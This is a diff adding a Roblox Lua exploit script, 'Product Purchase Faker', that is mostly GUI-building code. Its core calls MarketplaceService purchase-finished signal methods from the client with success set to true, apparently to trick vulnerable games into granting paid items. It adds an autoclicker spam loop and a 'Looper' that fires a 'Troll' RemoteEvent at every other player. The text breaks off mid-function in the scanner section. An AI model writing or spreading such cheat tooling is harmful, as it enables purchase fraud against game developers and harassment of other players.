@@ -1,0 +1,1121 @@
+-- Product Purchase Faker
+-- Written by fucking kidding by Smile B
+
+local UIS = game:GetService("UserInputService")
+local TS = game:GetService("TweenService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Color Palette Configuration
+local Theme = {
+    Background = Color3.fromRGB(15, 15, 20),
+    Card = Color3.fromRGB(24, 24, 33),
+    Accent = Color3.fromRGB(108, 92, 231),
+    AccentHover = Color3.fromRGB(90, 75, 200),
+    Text = Color3.fromRGB(245, 246, 250),
+    TextMuted = Color3.fromRGB(150, 150, 160),
+    Border = Color3.fromRGB(43, 47, 69),
+    Yellow = Color3.fromRGB(255, 201, 37),
+    DangerBg = Color3.fromRGB(44, 24, 24),
+    DangerBorder = Color3.fromRGB(120, 40, 40),
+    DangerText = Color3.fromRGB(255, 120, 120)
+}
+
+-- Safe Parent Selection
+local parent
+local coreGuiSuccess, coreGui = pcall(function() return game:GetService("CoreGui") end)
+if coreGuiSuccess and coreGui then
+    parent = coreGui
+else
+    parent = LocalPlayer:WaitForChild("PlayerGui")
+end
+
+-- Prevent duplication crashes by cleaning up prior instances
+local oldUI = parent:FindFirstChild("SmileB_PurchaseFaker")
+if oldUI then
+    oldUI:Destroy()
+end
+
+-- Create ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "SmileB_PurchaseFaker"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = parent
+
+-- Main Container Frame
+local mainbg = Instance.new("Frame")
+mainbg.Name = "MainBg"
+mainbg.AnchorPoint = Vector2.new(0.5, 0.5)
+mainbg.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainbg.Size = UDim2.new(0, 520, 0, 440)
+mainbg.BackgroundColor3 = Theme.Background
+mainbg.BorderSizePixel = 0
+mainbg.Parent = ScreenGui
+
+local mainbgCorner = Instance.new("UICorner")
+mainbgCorner.CornerRadius = UDim.new(0, 10)
+mainbgCorner.Parent = mainbg
+
+local mainbgStroke = Instance.new("UIStroke")
+mainbgStroke.Color = Theme.Border
+mainbgStroke.Thickness = 1.5
+mainbgStroke.Parent = mainbg
+
+-- Top Bar Header
+local TopBar = Instance.new("Frame")
+TopBar.Name = "TopBar"
+TopBar.Size = UDim2.new(1, 0, 0, 45)
+TopBar.BackgroundTransparency = 1
+TopBar.Parent = mainbg
+
+local Title = Instance.new("TextLabel")
+Title.Name = "Title"
+Title.Size = UDim2.new(0, 300, 1, 0)
+Title.Position = UDim2.new(0, 18, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Product Purchase Faker (RSHIFT)"
+Title.TextColor3 = Theme.Text
+Title.TextSize = 14
+Title.Font = Enum.Font.GothamBold
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = TopBar
+
+local Subtitle = Instance.new("TextLabel")
+Subtitle.Name = "Subtitle"
+Subtitle.Size = UDim2.new(0, 100, 1, 0)
+Subtitle.Position = UDim2.new(1, -45, 0, 0)
+Subtitle.AnchorPoint = Vector2.new(1, 0)
+Subtitle.BackgroundTransparency = 1
+Subtitle.Text = "by Smile B"
+Subtitle.TextColor3 = Theme.Accent
+Subtitle.TextSize = 11
+Subtitle.Font = Enum.Font.GothamSemibold
+Subtitle.TextXAlignment = Enum.TextXAlignment.Right
+Subtitle.Parent = TopBar
+
+-- Close Button (Standard "X" string to render on all operating systems)
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Name = "CloseBtn"
+CloseBtn.Size = UDim2.new(0, 24, 0, 24)
+CloseBtn.Position = UDim2.new(1, -12, 0.5, 0)
+CloseBtn.AnchorPoint = Vector2.new(1, 0.5)
+CloseBtn.BackgroundTransparency = 1
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Theme.TextMuted
+CloseBtn.TextSize = 12
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.Parent = TopBar
+
+CloseBtn.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+CloseBtn.MouseEnter:Connect(function()
+    TS:Create(CloseBtn, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(255, 100, 100)}):Play()
+end)
+CloseBtn.MouseLeave:Connect(function()
+    TS:Create(CloseBtn, TweenInfo.new(0.2), {TextColor3 = Theme.TextMuted}):Play()
+end)
+
+-- Tab Navigation Container
+local TabContainer = Instance.new("Frame")
+TabContainer.Name = "TabContainer"
+TabContainer.Position = UDim2.new(0, 18, 0, 45)
+TabContainer.Size = UDim2.new(1, -36, 0, 36)
+TabContainer.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
+TabContainer.Parent = mainbg
+
+local TabContainerCorner = Instance.new("UICorner")
+TabContainerCorner.CornerRadius = UDim.new(0, 8)
+TabContainerCorner.Parent = TabContainer
+
+local TabContainerStroke = Instance.new("UIStroke")
+TabContainerStroke.Color = Color3.fromRGB(35, 35, 48)
+TabContainerStroke.Thickness = 1
+TabContainerStroke.Parent = TabContainer
+
+local TabListLayout = Instance.new("UIListLayout")
+TabListLayout.FillDirection = Enum.FillDirection.Horizontal
+TabListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+TabListLayout.Padding = UDim.new(0, 4)
+TabListLayout.Parent = TabContainer
+
+local TabPadding = Instance.new("UIPadding")
+TabPadding.PaddingLeft = UDim.new(0, 4)
+TabPadding.PaddingRight = UDim.new(0, 4)
+TabPadding.PaddingTop = UDim.new(0, 4)
+TabPadding.PaddingBottom = UDim.new(0, 4)
+TabPadding.Parent = TabContainer
+
+local tabButtons = {}
+local function createTabButton(name, layoutOrder)
+    local button = Instance.new("TextButton")
+    button.Name = name .. "Tab"
+    button.Size = UDim2.new(0.333, -3, 1, 0)
+    button.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    button.BackgroundTransparency = 1
+    button.Text = name
+    button.TextColor3 = Theme.TextMuted
+    button.TextSize = 12
+    button.Font = Enum.Font.GothamSemibold
+    button.LayoutOrder = layoutOrder
+    button.Parent = TabContainer
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = button
+    
+    tabButtons[name] = button
+    return button
+end
+
+local scannerTabBtn = createTabButton("Scanner", 1)
+local listenerTabBtn = createTabButton("Listener", 2)
+local actionTabBtn = createTabButton("Action", 3)
+
+-- Tab View Content Frames
+local ContentFrame = Instance.new("Frame")
+ContentFrame.Name = "ContentFrame"
+ContentFrame.Position = UDim2.new(0, 18, 0, 92)
+ContentFrame.Size = UDim2.new(1, -36, 0, 330)
+ContentFrame.BackgroundTransparency = 1
+ContentFrame.Parent = mainbg
+
+local scannerTabFrame = Instance.new("ScrollingFrame")
+scannerTabFrame.Name = "ScannerTabFrame"
+scannerTabFrame.Size = UDim2.new(1, 0, 1, 0)
+scannerTabFrame.BackgroundTransparency = 1
+scannerTabFrame.BorderSizePixel = 0
+scannerTabFrame.ScrollBarThickness = 4
+scannerTabFrame.ScrollBarImageColor3 = Theme.Accent
+scannerTabFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+scannerTabFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+scannerTabFrame.Visible = false
+scannerTabFrame.Parent = ContentFrame
+
+local listenerTabFrame = Instance.new("ScrollingFrame")
+listenerTabFrame.Name = "ListenerTabFrame"
+listenerTabFrame.Size = UDim2.new(1, 0, 1, 0)
+listenerTabFrame.BackgroundTransparency = 1
+listenerTabFrame.BorderSizePixel = 0
+listenerTabFrame.ScrollBarThickness = 4
+listenerTabFrame.ScrollBarImageColor3 = Theme.Accent
+listenerTabFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+listenerTabFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+listenerTabFrame.Visible = false
+listenerTabFrame.Parent = ContentFrame
+
+local actionTabFrame = Instance.new("Frame")
+actionTabFrame.Name = "ActionTabFrame"
+actionTabFrame.Size = UDim2.new(1, 0, 1, 0)
+actionTabFrame.BackgroundTransparency = 1
+actionTabFrame.Visible = true
+actionTabFrame.Parent = ContentFrame
+
+local scannerListLayout = Instance.new("UIListLayout")
+scannerListLayout.Padding = UDim.new(0, 8)
+scannerListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+scannerListLayout.Parent = scannerTabFrame
+
+local listenerListLayout = Instance.new("UIListLayout")
+listenerListLayout.Padding = UDim.new(0, 8)
+listenerListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listenerListLayout.Parent = listenerTabFrame
+
+-- Interactive Hover Helpers
+local function addHoverEffect(button, defaultBg, hoverBg, defaultText, hoverText)
+    button.MouseEnter:Connect(function()
+        TS:Create(button, TweenInfo.new(0.2), {
+            BackgroundColor3 = hoverBg,
+            BackgroundTransparency = 0,
+            TextColor3 = hoverText or button.TextColor3
+        }):Play()
+    end)
+    button.MouseLeave:Connect(function()
+        TS:Create(button, TweenInfo.new(0.2), {
+            BackgroundColor3 = defaultBg,
+            BackgroundTransparency = defaultBg == Color3.fromRGB(0,0,0) and 1 or 0,
+            TextColor3 = defaultText or button.TextColor3
+        }):Play()
+    end)
+end
+
+-- Tab Selector Logic
+local function selectTab(tabName)
+    for name, btn in pairs(tabButtons) do
+        TS:Create(btn, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(30, 30, 40),
+            BackgroundTransparency = 1,
+            TextColor3 = Theme.TextMuted
+        }):Play()
+    end
+    
+    scannerTabFrame.Visible = false
+    listenerTabFrame.Visible = false
+    actionTabFrame.Visible = false
+    
+    local activeBtn = tabButtons[tabName]
+    if activeBtn then
+        TS:Create(activeBtn, TweenInfo.new(0.2), {
+            BackgroundColor3 = Theme.Accent,
+            BackgroundTransparency = 0,
+            TextColor3 = Color3.fromRGB(255, 255, 255)
+        }):Play()
+    end
+    
+    if tabName == "Scanner" then
+        scannerTabFrame.Visible = true
+    elseif tabName == "Listener" then
+        listenerTabFrame.Visible = true
+    elseif tabName == "Action" then
+        actionTabFrame.Visible = true
+    end
+end
+
+scannerTabBtn.MouseButton1Click:Connect(function() selectTab("Scanner") end)
+listenerTabBtn.MouseButton1Click:Connect(function() selectTab("Listener") end)
+actionTabBtn.MouseButton1Click:Connect(function() selectTab("Action") end)
+
+selectTab("Action")
+
+-- Draggable Interface Module
+local function makeDraggable(gui)
+    local dragging = false
+    local dragInput = nil
+    local dragStart = nil
+    local startPos = nil
+
+    gui.InputBegan:Connect(function(input)
+        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+            dragging = true
+            dragStart = input.Position
+            startPos = gui.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    gui.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UIS.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            if not dragStart or not startPos then return end
+            local delta = input.Position - dragStart
+            gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
+makeDraggable(mainbg)
+
+-- Toggle Visibility Hotkey (Right Shift works universally, even during Shift Lock)
+local isUIActive = true
+UIS.InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.RightShift then
+        isUIActive = not isUIActive
+        mainbg.Visible = isUIActive
+    end
+end)
+
+
+-- ==========================================
+-- ACTION TAB COMPONENTS & LAYOUT
+-- ==========================================
+
+local ActionLayout = Instance.new("UIListLayout")
+ActionLayout.Padding = UDim.new(0, 12)
+ActionLayout.SortOrder = Enum.SortOrder.LayoutOrder
+ActionLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+ActionLayout.Parent = actionTabFrame
+
+-- Input Field Container
+local InputContainer = Instance.new("Frame")
+InputContainer.Name = "InputContainer"
+InputContainer.Size = UDim2.new(1, 0, 0, 40)
+InputContainer.BackgroundColor3 = Theme.Card
+InputContainer.LayoutOrder = 1
+InputContainer.Parent = actionTabFrame
+
+local InputCorner = Instance.new("UICorner")
+InputCorner.CornerRadius = UDim.new(0, 8)
+InputCorner.Parent = InputContainer
+
+local InputStroke = Instance.new("UIStroke")
+InputStroke.Color = Theme.Border
+InputStroke.Thickness = 1
+InputStroke.Parent = InputContainer
+
+local ProductIDInput = Instance.new("TextBox")
+ProductIDInput.Name = "ProductIDInput"
+ProductIDInput.Size = UDim2.new(1, -24, 1, 0)
+ProductIDInput.Position = UDim2.new(0, 12, 0, 0)
+ProductIDInput.BackgroundTransparency = 1
+ProductIDInput.PlaceholderText = "Enter Product or Gamepass ID..."
+ProductIDInput.PlaceholderColor3 = Color3.fromRGB(100, 100, 115)
+ProductIDInput.Text = ""
+ProductIDInput.TextColor3 = Theme.Yellow
+ProductIDInput.TextSize = 13
+ProductIDInput.Font = Enum.Font.Code
+ProductIDInput.TextXAlignment = Enum.TextXAlignment.Left
+ProductIDInput.ClearTextOnFocus = false
+ProductIDInput.Parent = InputContainer
+
+ProductIDInput.Focused:Connect(function()
+    TS:Create(InputStroke, TweenInfo.new(0.2), {Color = Theme.Accent}):Play()
+end)
+ProductIDInput.FocusLost:Connect(function()
+    TS:Create(InputStroke, TweenInfo.new(0.2), {Color = Theme.Border}):Play()
+end)
+
+-- Autoclicker Toggle Row
+local ToggleContainer = Instance.new("Frame")
+ToggleContainer.Name = "ToggleContainer"
+ToggleContainer.Size = UDim2.new(1, 0, 0, 26)
+ToggleContainer.BackgroundTransparency = 1
+ToggleContainer.LayoutOrder = 1.5
+ToggleContainer.Parent = actionTabFrame
+
+local ToggleLabel = Instance.new("TextLabel")
+ToggleLabel.Size = UDim2.new(0.7, 0, 1, 0)
+ToggleLabel.BackgroundTransparency = 1
+ToggleLabel.Text = "Autoclicker / Spam Mode"
+ToggleLabel.TextColor3 = Theme.TextMuted
+ToggleLabel.TextSize = 12
+ToggleLabel.Font = Enum.Font.GothamSemibold
+ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
+ToggleLabel.Parent = ToggleContainer
+
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Size = UDim2.new(0, 50, 0, 22)
+ToggleBtn.Position = UDim2.new(1, 0, 0.5, 0)
+ToggleBtn.AnchorPoint = Vector2.new(1, 0.5)
+ToggleBtn.BackgroundColor3 = Theme.Card
+ToggleBtn.Text = "OFF"
+ToggleBtn.TextColor3 = Theme.TextMuted
+ToggleBtn.TextSize = 10
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.Parent = ToggleContainer
+
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.CornerRadius = UDim.new(0, 6)
+ToggleCorner.Parent = ToggleBtn
+
+local ToggleStroke = Instance.new("UIStroke")
+ToggleStroke.Color = Theme.Border
+ToggleStroke.Thickness = 1
+ToggleStroke.Parent = ToggleBtn
+
+-- Interactive Buttons Grid
+local GridContainer = Instance.new("Frame")
+GridContainer.Name = "GridContainer"
+GridContainer.Size = UDim2.new(1, 0, 0, 160)
+GridContainer.BackgroundTransparency = 1
+GridContainer.LayoutOrder = 2
+GridContainer.Parent = actionTabFrame
+
+local GridLayout = Instance.new("UIGridLayout")
+GridLayout.CellSize = UDim2.new(0.5, -6, 0, 46)
+GridLayout.CellPadding = UDim2.new(0, 12, 0, 10)
+GridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+GridLayout.Parent = GridContainer
+
+local function createActionButton(name, labelText, targetColor, layoutOrder)
+    local btn = Instance.new("TextButton")
+    btn.Name = name
+    btn.BackgroundColor3 = Theme.Card
+    btn.Text = labelText
+    btn.TextColor3 = Theme.Text
+    btn.TextSize = 13
+    btn.Font = Enum.Font.GothamBold
+    btn.LayoutOrder = layoutOrder
+    btn.Parent = GridContainer
+    
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 8)
+    btnCorner.Parent = btn
+    
+    local btnStroke = Instance.new("UIStroke")
+    btnStroke.Color = Theme.Border
+    btnStroke.Thickness = 1
+    btnStroke.Parent = btn
+    
+    local btnGradient = Instance.new("UIGradient")
+    btnGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 220, 220))
+    }
+    btnGradient.Rotation = 90
+    btnGradient.Parent = btn
+    
+    btn.MouseEnter:Connect(function()
+        TS:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(32, 32, 45)}):Play()
+        TS:Create(btnStroke, TweenInfo.new(0.2), {Color = targetColor}):Play()
+    end)
+    btn.MouseLeave:Connect(function()
+        TS:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Theme.Card}):Play()
+        TS:Create(btnStroke, TweenInfo.new(0.2), {Color = Theme.Border}):Play()
+    end)
+    
+    return btn
+end
+
+local HookBtn = createActionButton("HookBtn", "Signal Product", Theme.Accent, 1)
+local GamepassBtn = createActionButton("GamepassBtn", "Signal Gamepass", Theme.Accent, 2)
+local BulkBtn = createActionButton("BulkBtn", "Signal Bulk", Theme.Accent, 3)
+local PurchaseBtn = createActionButton("PurchaseBtn", "Signal Purchase", Theme.Accent, 4)
+local LooperBtn = createActionButton("LooperBtn", "Run Looper", Theme.Accent, 5)
+
+-- Info Warning Box
+local WarningFrame = Instance.new("Frame")
+WarningFrame.Name = "WarningFrame"
+WarningFrame.Size = UDim2.new(1, 0, 0, 42)
+WarningFrame.BackgroundColor3 = Theme.DangerBg
+WarningFrame.BackgroundTransparency = 0.3
+WarningFrame.LayoutOrder = 3
+WarningFrame.Parent = actionTabFrame
+
+local WarnCorner = Instance.new("UICorner")
+WarnCorner.CornerRadius = UDim.new(0, 8)
+WarnCorner.Parent = WarningFrame
+
+local WarnStroke = Instance.new("UIStroke")
+WarnStroke.Color = Theme.DangerBorder
+WarnStroke.Thickness = 1
+WarnStroke.Parent = WarningFrame
+
+local WarnText = Instance.new("TextLabel")
+WarnText.Size = UDim2.new(1, -24, 1, 0)
+WarnText.Position = UDim2.new(0, 12, 0, 0)
+WarnText.BackgroundTransparency = 1
+WarnText.Text = "⚠️ This won't actually charge your account or purchase the item. This generates fake client-side success signals locally."
+WarnText.TextColor3 = Theme.DangerText
+WarnText.TextSize = 10
+WarnText.Font = Enum.Font.GothamMedium
+WarnText.TextWrapped = true
+WarnText.TextXAlignment = Enum.TextXAlignment.Left
+WarnText.Parent = WarningFrame
+
+
+-- ==========================================
+-- SPAM & LOOPER ENGINE
+-- ==========================================
+
+local autoclickerEnabled = false
+local isSpamming = false
+local currentSpamType = nil
+
+local function getProductID()
+    local productID = tonumber(ProductIDInput.Text)
+    if not productID then
+        TS:Create(InputStroke, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, true), {Color = Color3.fromRGB(239, 68, 68)}):Play()
+        warn("[Faker] Invalid Product ID input.")
+        return nil
+    end
+    return productID
+end
+
+local function stopSpamming()
+    isSpamming = false
+    currentSpamType = nil
+    
+    for _, btn in ipairs({HookBtn, GamepassBtn, BulkBtn, PurchaseBtn, LooperBtn}) do
+        local stroke = btn:FindFirstChild("UIStroke")
+        if stroke then
+            TS:Create(stroke, TweenInfo.new(0.2), {Color = Theme.Border}):Play()
+        end
+    end
+end
+
+local function startSpamming(spamType, actionFunc, button)
+    stopSpamming()
+    isSpamming = true
+    currentSpamType = spamType
+    
+    local stroke = button:FindFirstChild("UIStroke")
+    if stroke then
+        TS:Create(stroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(46, 204, 113)}):Play()
+    end
+
+    task.spawn(function()
+        while isSpamming and currentSpamType == spamType do
+            local id = getProductID() or 3530789704
+            pcall(function()
+                actionFunc(id)
+            end)
+            task.wait(0.1)
+        end
+    end)
+end
+
+-- Toggle Handler
+ToggleBtn.MouseButton1Click:Connect(function()
+    autoclickerEnabled = not autoclickerEnabled
+    if autoclickerEnabled then
+        ToggleBtn.Text = "ON"
+        TS:Create(ToggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(46, 204, 113), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+        TS:Create(ToggleStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(46, 204, 113)}):Play()
+    else
+        ToggleBtn.Text = "OFF"
+        TS:Create(ToggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = Theme.Card, TextColor3 = Theme.TextMuted}):Play()
+        TS:Create(ToggleStroke, TweenInfo.new(0.2), {Color = Theme.Border}):Play()
+        stopSpamming()
+    end
+end)
+
+local function handleActionButtonClick(spamType, singleAction, button)
+    if autoclickerEnabled then
+        if isSpamming and currentSpamType == spamType then
+            stopSpamming()
+        else
+            startSpamming(spamType, singleAction, button)
+        end
+    else
+        local id = getProductID()
+        if id then
+            singleAction(id)
+        end
+    end
+end
+
+-- Defensive Remote Event Scanner (Prevents errors if path missing)
+local function fireRemote(targetPlayerName)
+    pcall(function()
+        local pg = LocalPlayer:FindFirstChild("PlayerGui")
+        local t1 = pg and pg:FindFirstChild("Troll")
+        local t2 = t1 and t1:FindFirstChild("Troll")
+        local btn = t2 and t2:FindFirstChild("TrollBtn")
+        local sc = btn and btn:FindFirstChild("LocalScript")
+        local ev = sc and sc:FindFirstChild("RemoteEvent")
+        if ev and ev:IsA("RemoteEvent") then
+            ev:FireServer(targetPlayerName)
+        end
+    end)
+end
+
+-- Looper Function
+local function runLooper(id)
+    id = id or 3530789704
+    for _, v in ipairs(Players:GetPlayers()) do
+        if v == LocalPlayer then continue end
+        fireRemote(v.Name)
+        task.wait()
+        pcall(function()
+            MarketplaceService:SignalPromptProductPurchaseFinished(LocalPlayer.UserId, id, true)
+        end)
+        task.wait(0.1)
+    end
+end
+
+-- Connect UI Buttons to Operations
+HookBtn.MouseButton1Click:Connect(function()
+    handleActionButtonClick("Product", function(id)
+        MarketplaceService:SignalPromptProductPurchaseFinished(LocalPlayer.UserId, id, true)
+    end, HookBtn)
+end)
+
+GamepassBtn.MouseButton1Click:Connect(function()
+    handleActionButtonClick("Gamepass", function(id)
+        MarketplaceService:SignalPromptGamePassPurchaseFinished(LocalPlayer, id, true)
+    end, GamepassBtn)
+end)
+
+BulkBtn.MouseButton1Click:Connect(function()
+    handleActionButtonClick("Bulk", function(id)
+        MarketplaceService:SignalPromptBulkPurchaseFinished(LocalPlayer.UserId, id, true)
+    end, BulkBtn)
+end)
+
+PurchaseBtn.MouseButton1Click:Connect(function()
+    handleActionButtonClick("Purchase", function(id)
+        MarketplaceService:SignalPromptPurchaseFinished(LocalPlayer.UserId, id, true)
+    end, PurchaseBtn)
+end)
+
+LooperBtn.MouseButton1Click:Connect(function()
+    handleActionButtonClick("Looper", function(id)
+        runLooper(id)
+    end, LooperBtn)
+end)
+
+
+-- ==========================================
+-- LOGS & UTILS
+-- ==========================================
+
+local function copyToClipboard(text)
+    local copied = pcall(function()
+        if setclipboard then
+            setclipboard(text)
+        elseif toclipboard then
+            toclipboard(text)
+        end
+    end)
+    return copied
+end
+
+local function addLog(pName, purchasedId, wasPurchased, typeName)
+    typeName = typeName or "Product"
+    
+    local LogFrame = Instance.new("Frame")
+    LogFrame.Name = "Log_" .. tostring(purchasedId)
+    LogFrame.Size = UDim2.new(1, -6, 0, 56)
+    LogFrame.BackgroundColor3 = Theme.Card
+    LogFrame.Parent = listenerTabFrame
+    
+    local LogCorner = Instance.new("UICorner")
+    LogCorner.CornerRadius = UDim.new(0, 8)
+    LogCorner.Parent = LogFrame
+    
+    local LogStroke = Instance.new("UIStroke")
+    LogStroke.Color = Theme.Border
+    LogStroke.Thickness = 1
+    LogStroke.Parent = LogFrame
+    
+    local TextContainer = Instance.new("Frame")
+    TextContainer.Size = UDim2.new(0.6, 0, 1, 0)
+    TextContainer.Position = UDim2.new(0, 12, 0, 0)
+    TextContainer.BackgroundTransparency = 1
+    TextContainer.Parent = LogFrame
+    
+    local LogList = Instance.new("UIListLayout")
+    LogList.SortOrder = Enum.SortOrder.LayoutOrder
+    LogList.Padding = UDim.new(0, 4)
+    LogList.VerticalAlignment = Enum.VerticalAlignment.Center
+    LogList.Parent = TextContainer
+    
+    local TitleLabel = Instance.new("TextLabel")
+    TitleLabel.Size = UDim2.new(1, 0, 0, 18)
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Text = pName
+    TitleLabel.TextColor3 = Theme.Text
+    TitleLabel.TextSize = 13
+    TitleLabel.Font = Enum.Font.GothamBold
+    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    TitleLabel.Parent = TextContainer
+    
+    local SubLabel = Instance.new("TextLabel")
+    SubLabel.Size = UDim2.new(1, 0, 0, 14)
+    SubLabel.BackgroundTransparency = 1
+    SubLabel.Text = "[" .. typeName .. "] ID: " .. tostring(purchasedId)
+    SubLabel.TextColor3 = Theme.Yellow
+    SubLabel.TextSize = 11
+    SubLabel.Font = Enum.Font.Code
+    SubLabel.TextXAlignment = Enum.TextXAlignment.Left
+    SubLabel.Parent = TextContainer
+    
+    local ButtonContainer = Instance.new("Frame")
+    ButtonContainer.Size = UDim2.new(0.35, 0, 1, 0)
+    ButtonContainer.Position = UDim2.new(0.65, -12, 0, 0)
+    ButtonContainer.BackgroundTransparency = 1
+    ButtonContainer.Parent = LogFrame
+    
+    local BtnList = Instance.new("UIListLayout")
+    BtnList.FillDirection = Enum.FillDirection.Horizontal
+    BtnList.HorizontalAlignment = Enum.HorizontalAlignment.Right
+    BtnList.VerticalAlignment = Enum.VerticalAlignment.Center
+    BtnList.SortOrder = Enum.SortOrder.LayoutOrder
+    BtnList.Padding = UDim.new(0, 8)
+    BtnList.Parent = ButtonContainer
+    
+    local LoadBtn = Instance.new("TextButton")
+    LoadBtn.Size = UDim2.new(0, 50, 0, 30)
+    LoadBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 48)
+    LoadBtn.Text = "Load"
+    LoadBtn.TextColor3 = Theme.TextMuted
+    LoadBtn.TextSize = 11
+    LoadBtn.Font = Enum.Font.GothamBold
+    LoadBtn.LayoutOrder = 1
+    LoadBtn.Parent = ButtonContainer
+    
+    local LoadCorner = Instance.new("UICorner")
+    LoadCorner.CornerRadius = UDim.new(0, 6)
+    LoadCorner.Parent = LoadBtn
+    
+    local LoadStroke = Instance.new("UIStroke")
+    LoadStroke.Color = Color3.fromRGB(50, 50, 70)
+    LoadStroke.Parent = LoadBtn
+    
+    local CopyBtn = Instance.new("TextButton")
+    CopyBtn.Size = UDim2.new(0, 50, 0, 30)
+    CopyBtn.BackgroundColor3 = Theme.Accent
+    CopyBtn.Text = "Copy"
+    CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CopyBtn.TextSize = 11
+    CopyBtn.Font = Enum.Font.GothamBold
+    CopyBtn.LayoutOrder = 2
+    CopyBtn.Parent = ButtonContainer
+    
+    local CopyCorner = Instance.new("UICorner")
+    CopyCorner.CornerRadius = UDim.new(0, 6)
+    CopyCorner.Parent = CopyBtn
+    
+    LoadBtn.MouseButton1Click:Connect(function()
+        ProductIDInput.Text = tostring(purchasedId)
+        selectTab("Action")
+        TS:Create(InputStroke, TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, true), {Color = Color3.fromRGB(34, 197, 94)}):Play()
+    end)
+    
+    CopyBtn.MouseButton1Click:Connect(function()
+        copyToClipboard(tostring(purchasedId))
+        CopyBtn.Text = "Copied!"
+        task.wait(1)
+        CopyBtn.Text = "Copy"
+    end)
+    
+    addHoverEffect(LoadBtn, Color3.fromRGB(35, 35, 48), Color3.fromRGB(50, 50, 70))
+    addHoverEffect(CopyBtn, Theme.Accent, Theme.AccentHover)
+end
+
+
+-- ==========================================
+-- SCANNER SYSTEM
+-- ==========================================
+
+local ScanControlHeader = Instance.new("Frame")
+ScanControlHeader.Name = "ScanControlHeader"
+ScanControlHeader.Size = UDim2.new(1, -6, 0, 45)
+ScanControlHeader.BackgroundColor3 = Theme.Card
+ScanControlHeader.LayoutOrder = 0
+ScanControlHeader.Parent = scannerTabFrame
+
+local ScanHeaderCorner = Instance.new("UICorner")
+ScanHeaderCorner.CornerRadius = UDim.new(0, 8)
+ScanHeaderCorner.Parent = ScanControlHeader
+
+local ScanHeaderStroke = Instance.new("UIStroke")
+ScanHeaderStroke.Color = Theme.Border
+ScanHeaderStroke.Thickness = 1
+ScanHeaderStroke.Parent = ScanControlHeader
+
+local ScanBtn = Instance.new("TextButton")
+ScanBtn.Size = UDim2.new(1, -24, 1, -12)
+ScanBtn.Position = UDim2.new(0, 12, 0, 6)
+ScanBtn.BackgroundColor3 = Theme.Accent
+ScanBtn.Text = "Scan Game for Purchase IDs"
+ScanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScanBtn.TextSize = 13
+ScanBtn.Font = Enum.Font.GothamBold
+ScanBtn.Parent = ScanControlHeader
+
+local ScanBtnCorner = Instance.new("UICorner")
+ScanBtnCorner.CornerRadius = UDim.new(0, 6)
+ScanBtnCorner.Parent = ScanBtn
+
+addHoverEffect(ScanBtn, Theme.Accent, Theme.AccentHover)
+
+local function createScannerLog(pName, purchasedId, typeName)
+    local LogFrame = Instance.new("Frame")
+    LogFrame.Name = "ScanLog_" .. tostring(purchasedId)
+    LogFrame.Size = UDim2.new(1, -6, 0, 56)
+    LogFrame.BackgroundColor3 = Theme.Card
+    LogFrame.Parent = scannerTabFrame
+    
+    local LogCorner = Instance.new("UICorner")
